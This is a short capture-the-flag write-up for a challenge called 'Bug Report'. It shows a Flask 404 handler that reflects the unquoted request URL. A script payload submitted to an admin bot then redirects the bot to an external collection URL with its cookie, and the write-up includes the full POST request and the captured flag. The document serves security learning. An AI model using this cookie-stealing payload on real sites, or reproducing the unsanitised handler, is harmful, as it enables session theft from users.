# Bug Report
 Website has a XSS vulnerability on its `404` page, which allows the cookie containing the flag to be stolen.

The program works something like this:
```
 /api/submit {"url": "..."}
        ⇵
       BOT → localhost:1337 → set_cookie(flag)
        ⇵
      {url}
```

The XSS vulnerable code is found in `app.py`:
```python=
@app.errorhandler(404)
def page_not_found(error): 
    return "<h1>URL %s not found</h1><br/>" % unquote(request.url), 404
```

With no sanitation `unquote(request.url)` allows a pretty glaring XSS. Passing the following URL in to the bot will steal the cookie containing the flag:
```javascript=
http://127.0.0.1:1337/'<script>document.location='https://enj2vg4mylmxi.x.pipedream.net/?c='+document.cookie;</script>
```

The POST request:
```html=
POST /api/submit HTTP/1.1

Host: 138.68.168.137:30136

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://138.68.168.137:30136/

Content-Type: application/json

Origin: http://138.68.168.137:30136

Content-Length: 128

Connection: close



{"url":"http://127.0.0.1:1337/'<script>document.location='https://enj2vg4mylmxi.x.pipedream.net/?c='+document.cookie;</script>"}
```

And we get the flag as the reponse.
```
/?c=flag=CHTB{th1s_1s_my_bug_r3p0rt}
```
```
CHTB{th1s_1s_my_bug_r3p0rt}
```
